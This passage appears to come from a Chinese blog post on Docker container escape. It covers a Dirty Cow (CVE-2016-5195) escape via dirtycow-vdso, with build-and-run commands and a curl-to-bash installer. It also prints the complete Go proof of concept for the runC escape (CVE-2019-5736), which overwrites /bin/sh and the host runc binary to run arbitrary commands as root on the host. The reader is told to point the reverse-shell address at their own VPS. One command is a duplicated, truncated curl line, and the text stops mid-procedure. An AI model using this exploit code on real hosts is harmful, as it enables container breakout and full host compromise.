check1.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;剩下还有一堆我复现不了的逃逸方法，仅在此做记录，不代表具有真实可行性&lt;/p&gt;
&lt;h3 id=&#34;6dirty-cow-漏洞逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6dirty-cow-漏洞逃逸&#34;&gt;#&lt;/a&gt; 6.Dirty Cow 漏洞逃逸&lt;/h3&gt;
&lt;p&gt;Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，源于 Linux 内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。&lt;/p&gt;
&lt;p&gt;竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得 root 权限。VDSO 就是 Virtual Dynamic Shared Object（虚拟动态共享对象），&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS12c3E4OWJsNGJqNTJhbjhhbXpvYzQxYXc5MWEuc28=&#34;&gt;即内核提供的虚拟.so&lt;/span&gt;。该.so 文件位于内核而非磁盘，程序启动时，内核把包含某.so 的内存页映射入其内存空间，对应程序就可作为普通.so 使用其中的函数。&lt;/p&gt;
&lt;p&gt;在容器中利用 VDSO 内存空间中的 “clock_gettime () ” 函数可对脏牛漏洞发起攻击，令系统崩溃并获得 root 权限的 shell，且浏览容器之外主机上的文件。&lt;/p&gt;
&lt;p&gt;centos 下自动安装 docker 环境&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;amp;&amp;amp; bash install.sh  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;1. 运行漏洞 exp&lt;/p&gt;
&lt;p&gt;下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmdpdGh1Yi5jb20lMkZzY3VtanIlMkZkaXJ0eWNvdy12ZHNv&#34;&gt;https://github.com/scumjr/dirtycow-vdso&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2. 编译&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /dirtycow-vdso/    //进入dirtycow-vdso文件夹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make       //使用make命令编译.c文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./0xdeadbeef     //运行0xdeadbeef 文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;显示 successfully 表示成功。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1594194364.png!small&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功获取到宿主机的 shell。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1594194403.png!small&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;7runc逃逸-cve-2019-5736&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7runc逃逸-cve-2019-5736&#34;&gt;#&lt;/a&gt; 7.runC 逃逸 - CVE-2019-5736&lt;/h3&gt;
&lt;p&gt;docker version &amp;lt;=18.09.2 RunC version &amp;lt;=1.0-rc6&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl &lt;span class=&#34;attr&#34;&gt;https&lt;/span&gt;:&lt;span class=&#34;comment&#34;&gt;//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o i&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Docker、containerd 或者其他基于 runc 的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改掉 runc 的二进制文件，从而获取到宿主机的 root 执行权限。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先编译 go 脚本，生成攻击 payload&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmdpdGh1Yi5jb20lMkZGcmljaGV0dGVuJTJGQ1ZFLTIwMTktNTczNi1Qb0M=&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;修改脚本中的反弹地址为自己 vps 地址。&lt;/p&gt;
&lt;figure class=&#34;highlight go&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Implementation of CVE-2019-5736&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Created with help from @singe, @_cablethief, and @feexd.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// This commit also helped a ton to understand the vuln&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;io/ioutil&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;strconv&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;strings&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; shellCmd &lt;span class=&#34;type&#34;&gt;string&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag.StringVar(&amp;amp;shellCmd, &lt;span class=&#34;string&#34;&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Execute arbitrary commands&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag.Parse()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// This is the line of shell commands that will execute on the host&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;#!/bin/bash \n&amp;quot;&lt;/span&gt; + shellCmd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// First we overwrite /bin/sh with the /proc/self/exe interpreter path&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fd, err := os.Create(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		fmt.Println(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fmt.Fprintln(fd, &lt;span class=&#34;string&#34;&gt;&amp;quot;#!/proc/self/exe&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	err = fd.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		fmt.Println(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fmt.Println(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Overwritten /bin/sh successfully&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// Loop through all processes to find one whose cmdline includes runcinit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// This will be the process created by runc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; found &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; found == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		pids, err := ioutil.ReadDir(&lt;span class=&#34;string&#34;&gt;&amp;quot;/proc&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			fmt.Println(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; _, f := &lt;span class=&#34;keyword&#34;&gt;range&lt;/span&gt; pids &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			fbytes, _ := ioutil.ReadFile(&lt;span class=&#34;string&#34;&gt;&amp;quot;/proc/&amp;quot;&lt;/span&gt; + f.Name() + &lt;span class=&#34;string&#34;&gt;&amp;quot;/cmdline&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			fstring := &lt;span class=&#34;type&#34;&gt;string&lt;/span&gt;(fbytes)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; strings.Contains(fstring, &lt;span class=&#34;string&#34;&gt;&amp;quot;runc&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				fmt.Println(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Found the PID:&amp;quot;&lt;/span&gt;, f.Name())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				found, err = strconv.Atoi(f.Name())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; err != &lt;span class=&#34;literal&#34;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					fmt.Println(err)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// We will use the pid to get a file handle for runc on the host.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; handleFd = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; handleFd == &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// Note, you do not need to use the O_PATH flag for the exploit to work.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		handle, _ := os.OpenFile(&lt;span class=&#34;string&#34;&gt;&amp;quot;/proc/&amp;quot;&lt;/span&gt;+strconv.Itoa(found)+&lt;span class=&#34;string&#34;&gt;&amp;quot;/exe&amp;quot;&lt;/span&gt;, os.O_RDONLY, &lt;span class=&#34;number&#34;&gt;0777&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;(handle.Fd()) &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			handleFd = &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;(handle.Fd())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fmt.Println(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Successfully got the file handle&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// Now that we have the file handle, lets write to the runc binary and overwrite it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;// It will maintain it&amp;#x27;s executable flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		writeHandle, _ := os.OpenFile(&lt;span class=&#34;string&#34;&gt;&amp;quot;/proc/self/fd/&amp;quot;&lt;/span&gt;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, &lt;span class=&#34;number&#34;&gt;0700&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;(writeHandle.Fd()) &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			fmt.Println(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Successfully got write handle&amp;quot;&lt;/span&gt;, writeHandle)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			fmt.Println(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] The command executed is&amp;quot;&lt;/span&gt; + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			writeHandle.Write([]&lt;span class=&#34;type&#34;&gt;byte&lt;/span&gt;(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编译生成 payload，需要在 linux 中需要安装 go 环境 &lt;code&gt;yum install go&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;go bulid main.go&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将编译生成文件复制到 docker 中&lt;/p&gt;
